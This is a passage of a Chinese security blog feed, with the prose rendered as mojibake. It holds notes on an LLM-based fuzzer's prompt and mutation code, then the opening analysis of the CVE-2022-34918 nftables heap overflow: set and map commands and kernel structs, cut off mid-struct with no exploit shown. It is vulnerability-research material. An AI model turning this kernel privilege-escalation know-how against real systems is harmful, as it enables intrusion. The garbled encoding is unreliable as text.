python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">fos = self.model.generate(<br>    prompt,<br>    batch_size=self.batch_size,<br>    temperature=self.temperature,<br>    max_length=self.max_length,<br>)<br></code></pre></td></tr></table></figure><p><em>generateè§model.py</em></p></li><li><p>å¯¹äºæ¯ä¸ªoutputï¼š</p><ul><li><p>è¡¥å……beginï¼Œä¸ºäº†ç¼–è¯‘æˆ–è¿è¡Œä¹‹åä¼šå»æ‰</p></li><li><p>å°†outputå†™å›æ–‡ä»¶</p></li><li><p>è°ƒç”¨validate_individualéªŒè¯è¾“å‡ºï¼Œå°±æ˜¯ç¼–è¯‘æˆ–è¿è¡Œ</p></li><li><p>å¦‚æœoutputï¼š</p><ul><li>éªŒè¯ä¸ºSAFE</li><li>åŒ…å«ç›®æ ‡apiï¼Œfilteræ¸…é™¤begin</li><li>clean_codeæ¸…é™¤æ³¨é‡Šå’Œç©ºè¡Œåä¸åœ¨seté‡Œ</li></ul><p>åˆ™æ”¾å…¥setï¼Œscore+1</p></li></ul></li><li><p>è¿”å›score</p></li></ul><h5 id="auto-prompt"><a href="#auto-prompt" class="headerlink" title="auto_prompt"></a>auto_prompt</h5><p>ç”Ÿæˆåˆå§‹prompt</p><ul><li><p>å·¥ä½œè·¯å¾„ä¸‹åˆ›å»ºpromptæ–‡ä»¶å¤¹</p></li><li><p>å¦‚æœå·²ç»æœ‰promptï¼Œåˆ™ç›´æ¥ä½¿ç”¨</p></li><li><p>å¦‚æœè®¾ç½®äº†no_input_promptï¼Œåˆ™ç›´æ¥ä½¿ç”¨prompt_usedä¸­çš„separatorå’Œbeginä½œä¸ºbest_prompt</p></li><li><p>å¦‚æœè®¾ç½®äº†use_hand_written_promptï¼Œåˆ™ä½¿ç”¨hand written prompt</p></li><li><p>å¦åˆ™è‡ªåŠ¨ç”Ÿæˆprompt</p></li><li><p>è°ƒç”¨create_configç”Ÿæˆconfigï¼Œtemperatureä¸º0</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">config = &#123;<br>    <span class="hljs-string">&quot;model&quot;</span>: <span class="hljs-string">&quot;gpt-3.5-turbo&quot;</span>,<br>    <span class="hljs-string">&quot;max_token&quot;</span>: <span class="hljs-number">500</span>,<br>    <span class="hljs-string">&quot;temperature&quot;</span>: <span class="hljs-number">0.0</span>,<span class="hljs-comment"># risk</span><br>    <span class="hljs-string">&quot;message&quot;</span>: [<br>        &#123;<span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;content&quot;</span>: self.AP_SYSTEM_MESSAGE&#125;,<br>        &#123;<span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;content&quot;</span>: message + <span class="hljs-string">&#x27;\n&#x27;</span> + self.AP_INSTRUCTION&#125; <span class="hljs-comment"># messageæ˜¯æ–‡æ¡£</span><br>    ]<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>è°ƒç”¨request_engineè·å–gptçš„response</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">response = request_engine(config)<br></code></pre></td></tr></table></figure></li><li><p>é€‰å–ç¬¬ä¸€ä¸ªmessageä½œä¸ºgreedy_prompt</p></li><li><p>best_promptåˆå§‹åŒ–ä¸ºgreedy_promptï¼Œè°ƒç”¨validate_promptç»™greedy_promptæ‰“åˆ†ï¼Œscoreè¡¨ç¤ºæœ‰æ•ˆè¾“å‡ºçš„ä¸ªæ•°ï¼Œå…·ä½“ä¸ºåŒ…å«ç›®æ ‡apiçš„ã€ä¸é‡å¤çš„outputæ•°é‡</p></li><li><p>é‡å¤ä¸‰æ¬¡request_engineï¼ˆtemperatureä¸º1ï¼‰å’Œvalidate_prompté€‰å–åˆ†æ•°æœ€é«˜çš„promptä½œä¸ºbest_prompt</p></li></ul><h5 id="initialize"><a href="#initialize" class="headerlink" title="initialize"></a>initialize</h5><p>targetåˆå§‹åŒ–ï¼ŒåŠ è½½æ¨¡å‹ï¼Œåˆå§‹åŒ–prompt</p><ul><li><p>åˆå§‹åŒ–ä¸€ä¸ªeosåˆ—è¡¨ï¼Œè¿™äº›promptæ ¹æ®éœ€è¦ä½œä¸ºè¯­å¥ç»“å°¾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">[<br>    trigger_to_generate_input,<br>    <span class="hljs-string">&quot;&lt;eom&gt;&quot;</span>, <span class="hljs-comment"># for codegen2</span><br>    se_prompt,<br>    m_prompt,<br>    c_prompt<br>]<br></code></pre></td></tr></table></figure></li><li><p>æ·»åŠ special_eosï¼Œgoå’Œsmtæœ‰è¿™ä¸ª</p></li><li><p>è°ƒç”¨make_modelåŠ è½½æ¨¡å‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">self.model = make_model(<br>    eos=eos,<br>    model_name=model_name,<br>    device=self.device,<br>    max_length=self.max_length,<br>)<br></code></pre></td></tr></table></figure><p><em>make_modelè§model.py</em></p></li><li><p>è°ƒç”¨auto_promptè·å–initial_prompt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">self.initial_prompt = self.auto_prompt(<br>    message=self.prompt_used[<span class="hljs-string">&quot;docstring&quot;</span>],<br>    hw_prompt=self.prompt_used[<span class="hljs-string">&quot;hw_prompt&quot;</span>] <span class="hljs-keyword">if</span> self.hw <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>,<br>    hw=self.hw,<br>    no_input_prompt=self.no_input_prompt,<br>)<br></code></pre></td></tr></table></figure><p>å‚æ•°ï¼š</p><ul><li>messageï¼šæ–‡æ¡£</li><li>hw_promptï¼šä¸€äº›å†™å¥½çš„prompt</li><li>hwï¼šæ˜¯å¦ä½¿ç”¨hand written prompt</li><li>no_input_promptï¼šä¸éœ€è¦è¾“å…¥prompt</li></ul></li></ul><h5 id="update-strategy"><a href="#update-strategy" class="headerlink" title="update_strategy"></a>update_strategy</h5><p>é€‰æ‹©ä¸€ä¸ªå˜å¼‚ç­–ç•¥ï¼Œç”Ÿæˆæ–°çš„prompt</p><ul><li><p>0ï¼šnew_code+trigger_to_generate_input</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">f&quot;\n<span class="hljs-subst">&#123;new_code&#125;</span>\n<span class="hljs-subst">&#123;self.prompt_used[<span class="hljs-string">&#x27;separator&#x27;</span>]&#125;</span>\n&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>1ï¼šå˜å¼‚new_code</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">f&quot;\n<span class="hljs-subst">&#123;new_code&#125;</span>\n<span class="hljs-subst">&#123;self.m_prompt&#125;</span>\n&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>2ï¼šè¯­æ³•ç­‰ä»·new_code</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">f&quot;\n<span class="hljs-subst">&#123;new_code&#125;</span>\n<span class="hljs-subst">&#123;self.se_prompt&#125;</span>\n&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>3ï¼šç»“åˆå‰ä¸¤ä¸ªç”Ÿæˆçš„ä»£ç ï¼š</p><ul><li>prev_example</li><li>trigger_to_generate_input</li><li>input_hint</li><li>new_code</li><li>combine prompt</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">f&quot;\n<span class="hljs-subst">&#123;self.prev_example&#125;</span>\n<span class="hljs-subst">&#123;self.prompt_used[<span class="hljs-string">&#x27;separator&#x27;</span>]&#125;</span>\n<span class="hljs-subst">&#123;self.prompt_used[<span class="hljs-string">&#x27;begin&#x27;</span>]&#125;</span>\n<span class="hljs-subst">&#123;new_code&#125;</span>\n<span class="hljs-subst">&#123;self.c_prompt&#125;</span>\n&quot;</span><br></code></pre></td></tr></table></figure></li></ul><h5 id="update"><a href="#update" class="headerlink" title="update"></a>update</h5><p>æ¯è½®fuzz loopåæ›´æ–°target</p><ul><li><p>é€‰æ‹©æœ€åä¸€ä¸ªfilteråˆæ³•ã€clean_codeåä¸ç­‰äºprev_exampleçš„code</p></li><li><p>æ›´æ–°promptä¸ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">self.prompt = (<br>    self.initial_prompt<br>    + self.update_strategy(new_code)<br>    + self.prompt_used[<span class="hljs-string">&quot;begin&quot;</span>]<br>    + <span class="hljs-string">&quot;\n&quot;</span><br>)<br></code></pre></td></tr></table></figure></li><li><p>æ›´æ–°prev_exampleä¸ºcode</p></li></ul><h3 id="C-py"><a href="#C-py" class="headerlink" title="C.py"></a>C.py</h3><h4 id="class-CTarget"><a href="#class-CTarget" class="headerlink" title="class CTarget"></a>class CTarget</h4><h5 id="init-2"><a href="#init-2" class="headerlink" title="__init__"></a>__init__</h5><ul><li><p>SYSTEM_MESSAGEï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;You are a C Fuzzer&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>config_dict</p></li><li><p>prompt_usedï¼šè°ƒç”¨_create_prompt_from_configç”Ÿæˆï¼ŒåŒ…æ‹¬</p><ul><li>docstringï¼šæ–‡æ¡£</li><li>example_codeï¼šç¤ºä¾‹ä»£ç </li><li>separatorï¼štrigger_to_generate_inputï¼Œè§é…ç½®æ–‡ä»¶</li><li>beginï¼šinput_hintï¼Œè§é…ç½®æ–‡ä»¶</li><li>hw_promptï¼šå†™å¥½çš„prompt</li><li>target_apiï¼šæµ‹è¯•ç›®æ ‡</li></ul><p><em>_create_prompt_from_configè§target&#x2F;target.py</em></p></li></ul><h5 id="wrap-prompt"><a href="#wrap-prompt" class="headerlink" title="wrap_prompt"></a>wrap_prompt</h5><p>promptæ‰“åŒ…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* prompt */</span><br>trigger_to_generate_input<br>input_hint<br></code></pre></td></tr></table></figure><p>ç¤ºä¾‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* prompt */</span><br><span class="hljs-comment">/* Please create a short program which uses new C features in a complex way */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzz</tag>
      
      <tag>llm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-34918 nftableså †æº¢å‡º</title>
    <link href="/2025/01/07/cve-2022-34918/"/>
    <url>/2025/01/07/cve-2022-34918/</url>
    
    <content type="html"><![CDATA[<ul><li><strong>å½±å“ç‰ˆæœ¬</strong>ï¼šåŸä½œè€…åœ¨Ubuntu 22.04ï¼ˆ5.15.0ï¼‰ä¸ŠæˆåŠŸææƒï¼Œæœ¬ç¯‡ä½¿ç”¨5.17.15</li><li>åˆ©ç”¨æ¡ä»¶ï¼šCAP_NET_ADMIN</li></ul><p>å‚è€ƒï¼š<a href="https://bsauce.github.io/2022/07/26/CVE-2022-34918/">ã€kernel exploitã€‘CVE-2022-34918 nftableå †æº¢å‡ºæ¼æ´åˆ©ç”¨ï¼ˆlist_headä»»æ„å†™ï¼‰</a></p><p>èƒŒç–¼o(â•¥ï¹â•¥)o</p><span id="more"></span><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><h2 id="setï¼Œmapï¼Œvmap"><a href="#setï¼Œmapï¼Œvmap" class="headerlink" title="setï¼Œmapï¼Œvmap"></a>setï¼Œmapï¼Œvmap</h2><ul><li><p>set</p><ul><li>æ“ä½œè¡Œä¸º<ul><li>add</li><li>delete</li><li>destroy</li><li>list</li><li>flush</li><li>reset</li></ul></li><li>é›†åˆè§„æ ¼<ul><li>typeï¼ˆstringï¼‰ï¼šipv4_addrï¼Œipv6_addrï¼Œether_addrï¼Œinet_protoï¼Œinet_serviceï¼Œmark</li><li>typeofï¼ˆexpressionï¼‰</li><li>flagsï¼ˆstringï¼‰ï¼šconstantï¼Œdynamicï¼Œintervalï¼Œtimeout</li><li>timeoutï¼š string, decimal followed by unit (d, h, m, s)</li><li>gc-intervalï¼šstring, decimal followed by unit (d, h, m, s)</li><li>elementsï¼šdepends on â€˜typeâ€™</li><li>sizeï¼šunsigned integerï¼ˆ64 bitï¼‰</li><li>policyï¼ˆstringï¼‰ï¼šperformanceï¼ˆdefaultï¼‰ï¼Œmemory</li><li>auto-mergeï¼šboolean or specific parameters</li></ul></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">add <span class="hljs-built_in">set</span> [family] table <span class="hljs-built_in">set</span> &#123; <span class="hljs-built_in">type</span> <span class="hljs-built_in">type</span> | typeof expression ; [flags flags ;] [<span class="hljs-built_in">timeout</span> <span class="hljs-built_in">timeout</span> ;] [gc-interval gc-interval ;] [elements = &#123; element[, ...] &#125; ;] [size size ;] [comment comment ;] [policy policy ;] [auto-merge ;] &#125;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">&#123;delete | destroy | list | flush | reset &#125; <span class="hljs-built_in">set</span> [family] table <span class="hljs-built_in">set</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">list sets [family]</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">delete <span class="hljs-built_in">set</span> [family] table handle handle</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">&#123;add | delete | destroy &#125; element [family] table <span class="hljs-built_in">set</span> &#123; element[, ...] &#125;</span><br></code></pre></td></tr></table></figure></li><li><p>map</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">add map [family] table map &#123; <span class="hljs-built_in">type</span> <span class="hljs-built_in">type</span> | typeof expression [flags flags ;] [elements = &#123; element[, ...] &#125; ;] [size size ;] [comment comment ;] [policy policy ;] &#125;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">&#123;delete | destroy | list | flush | reset &#125; map [family] table map</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">list maps [family]</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">&#123;add | create | delete | destroy | get | reset &#125; element [family] table <span class="hljs-built_in">set</span> &#123; ELEMENT[, ...] &#125;</span><br>ELEMENT := key_expression OPTIONS [: value_expression]<br>OPTIONS := [timeout TIMESPEC] [expires TIMESPEC] [comment string]<br>TIMESPEC := [numd][numh][numm][num[s]]<br></code></pre></td></tr></table></figure></li><li><p>vmapsï¼šå°†å…ƒç´ ç›´æ¥æ˜ å°„åˆ°è£å†³ï¼ˆverdictï¼‰è¯­å¥ä¸Šï¼Œè£å†³è¯­å¥å†³å®šäº†å½“åŒ¹é…åˆ°ç‰¹å®šè§„åˆ™æ—¶åº”è¯¥é‡‡å–çš„åŠ¨ä½œï¼Œæ¯”å¦‚acceptã€rejectæˆ–drop</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add map table-name map-name &#123; <span class="hljs-built_in">type</span> inet_proto : verdict \; &#125;</span><br></code></pre></td></tr></table></figure><p>å…¶å®å°±æ˜¯ä¸€ç§ç‰¹æ®Šçš„map</p></li></ul><h2 id="ç›¸å…³æºç åˆ†æ"><a href="#ç›¸å…³æºç åˆ†æ" class="headerlink" title="ç›¸å…³æºç åˆ†æ"></a>ç›¸å…³æºç åˆ†æ</h2><p>ä»¥ä¸Šä¸‰ä¸ªéƒ½æ˜¯ç”¨setå®ç°çš„</p><h3 id="nftablesåˆ›å»ºé›†åˆ"><a href="#nftablesåˆ›å»ºé›†åˆ" class="headerlink" title="nftablesåˆ›å»ºé›†åˆ"></a>nftablesåˆ›å»ºé›†åˆ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add <span class="hljs-built_in">set</span> inet my_table my_set &#123; <span class="hljs-built_in">type</span> ipv4_addr \; &#125;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list sets</span><br>table inet my_table &#123;<br>        set my_set &#123;<br>                type ipv4_addr<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å‘é›†åˆä¸­æ·»åŠ å…ƒç´ </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add element inet my_table my_set &#123; 10.10.10.22, 10.10.10.33 &#125;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list <span class="hljs-built_in">set</span> inet my_table my_set</span><br>table inet my_table &#123;<br>        set my_set &#123;<br>                type ipv4_addr<br>                elements = &#123; 10.10.10.22, 10.10.10.33 &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¼•ç”¨é›†åˆ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft insert rule inet my_table my_filter_chain ip saddr @my_set drop</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft list chain inet my_table my_filter_chain</span><br>table inet my_table &#123;<br>        chain my_filter_chain &#123;<br>                type filter hook input priority 0; policy accept;<br>                ip saddr @my_set drop<br>                tcp dport http accept<br>                tcp dport nfs accept<br>                tcp dport ssh accept<br>                ip saddr &#123; 10.10.10.123, 10.10.10.231 &#125; accept<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¦æƒ…è§<a href="https://akaieurus.github.io/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#%E9%9B%86%E5%90%88">å¦ä¸€ç¯‡åšå®¢</a></p><p>åˆ›å»ºé›†åˆå…ƒç´ çš„å›è°ƒå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nfnl_callback</span> <span class="hljs-title">nf_tables_cb</span>[<span class="hljs-title">NFT_MSG_MAX</span>] =</span> &#123;<br>    <span class="hljs-comment">// â€¦â€¦</span><br>    [NFT_MSG_NEWSETELEM] = &#123;<br>        .call= nf_tables_newsetelem,<br>        .type= NFNL_CB_BATCH,<br>        .attr_count= NFTA_SET_ELEM_LIST_MAX,<br>        .policy= nft_set_elem_list_policy,<br>    &#125;,<br>    <span class="hljs-comment">// â€¦â€¦</span><br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ†æä½¿ç”¨çš„å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add table inet my_table</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add <span class="hljs-built_in">set</span> inet my_table my_set &#123;<span class="hljs-built_in">type</span> ipv4_addr \;&#125;</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">nft add element inet my_table my_set &#123;10.10.10.22&#125;</span><br></code></pre></td></tr></table></figure><h3 id="nla"><a href="#nla" class="headerlink" title="nla"></a>nla</h3><p>nlaç›¸å…³æ•°æ®å¤„ç†</p><h4 id="nf-tables-newsetelem"><a href="#nf-tables-newsetelem" class="headerlink" title="nf_tables_newsetelem"></a>nf_tables_newsetelem</h4><ul><li><p>è¿›å…¥æ—¶çš„å‚æ•°nlaï¼Œä¸€ä¸ªnlattræŒ‡é’ˆçš„æ•°ç»„ï¼Œnlattrçš„ç»“æ„å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *  &lt;------- NLA_HDRLEN ------&gt; &lt;-- NLA_ALIGN(payload)--&gt;</span><br><span class="hljs-comment"> * +---------------------+- - -+- - - - - - - - - -+- - -+</span><br><span class="hljs-comment"> * |        Header       | Pad |     Payload       | Pad |</span><br><span class="hljs-comment"> * |   (struct nlattr)   | ing |                   | ing |</span><br><span class="hljs-comment"> * +---------------------+- - -+- - - - - - - - - -+- - -+</span><br><span class="hljs-comment"> *  &lt;-------------- nlattr-&gt;nla_len --------------&gt;</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nlattr</span> &#123;</span><br>__u16           nla_len;<br>__u16           nla_type;<br>&#125;;<br></code></pre></td></tr></table></figure><p>nlaæ•°ç»„çš„idxå’Œå†…å®¹å¯¹åº”</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nft_set_elem_list_attributes</span> &#123;</span><br>NFTA_SET_ELEM_LIST_UNSPEC,<br>NFTA_SET_ELEM_LIST_TABLE,<br>NFTA_SET_ELEM_LIST_SET,<br>NFTA_SET_ELEM_LIST_ELEMENTS,<br>NFTA_SET_ELEM_LIST_SET_ID,<br>__NFTA_SET_ELEM_LIST_MAX<br>&#125;;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NFTA_SET_ELEM_LIST_MAX(__NFTA_SET_ELEM_LIST_MAX - 1)</span><br></code></pre></td></tr></table></figure><ul><li><p>nla</p></li><li><p>table</p></li><li><p>set</p></li><li><p>elementsï¼Œåé¢ä¼šé€è§£æ</p></li><li><p>set_id</p></li></ul></li><li><p>æ¥ä¸‹æ¥å°±æ˜¯æƒ¯ä¾‹æŸ¥æ‰¾tableæŸ¥æ‰¾setï¼Œè°ƒç”¨nft_add_set_elemæ·»åŠ setå…ƒç´ </p></li></ul><h4 id="nft-add-set-elem"><a href="#nft-add-set-elem" class="headerlink" title="nft_add_set_elem"></a>nft_add_set_elem</h4><ul><li><p>è¿›å…¥æ—¶çš„å‚æ•°attrå°±æ˜¯ä¸Šé¢çš„elementsï¼Œå…ˆé€è§£æä¸ºnla</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nft_set_elem_attributes</span> &#123;</span><br>NFTA_SET_ELEM_UNSPEC,<br>NFTA_SET_ELEM_KEY,<br>NFTA_SET_ELEM_DATA,<br>NFTA_SET_ELEM_FLAGS,<br>NFTA_SET_ELEM_TIMEOUT,<br>NFTA_SET_ELEM_EXPIRATION,<br>NFTA_SET_ELEM_USERDATA,<br>NFTA_SET_ELEM_EXPR,<br>NFTA_SET_ELEM_PAD,<br>NFTA_SET_ELEM_OBJREF,<br>NFTA_SET_ELEM_KEY_END,<br>NFTA_SET_ELEM_EXPRESSIONS,<br>__NFTA_SET_ELEM_MAX<br>&#125;;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NFTA_SET_ELEM_MAX(__NFTA_SET_ELEM_MAX - 1)</span><br></code></pre></td></tr></table></figure><p>åªæœ‰keyæœ‰æ•°æ®ï¼Œipåœ°å€</p></li><li><p>åé¢å°±æ˜¯nlaè§£æï¼Œå¡«å…¥nft_set_elemï¼Œè¿™é‡Œåªæœ‰keyéœ€è¦è§£æï¼Œelem.keyå†…å®¹è§ä¸‹</p><p>elemçš„ç»“æ„</p><ul><li>key</li><li>key_end</li><li>data</li><li>priv</li></ul><p>å‰ä¸‰ä¸ªæˆå‘˜æ˜¯ä¸€ä¸ªbufæˆ–ä¸€ä¸ªç†Ÿæ‚‰çš„nft_dataï¼Œå¯„å­˜å™¨ä¹Ÿæ˜¯ç”¨è¿™ä¸ªè¡¨ç¤ºçš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_set_elem</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>u32buf[NFT_DATA_VALUE_MAXLEN / <span class="hljs-keyword">sizeof</span>(u32)];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_data</span><span class="hljs-title">val</span>;</span><br>&#125; key;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>u32buf[NFT_DATA_VALUE_MAXLEN / <span class="hljs-keyword">sizeof</span>(u32)];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_data</span><span class="hljs-title">val</span>;</span><br>&#125; key_end;<br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>u32buf[NFT_DATA_VALUE_MAXLEN / <span class="hljs-keyword">sizeof</span>(u32)];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_data</span> <span class="hljs-title">val</span>;</span><br>&#125; data;<br><span class="hljs-type">void</span>*priv;<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_data</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>u32data[<span class="hljs-number">4</span>];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span 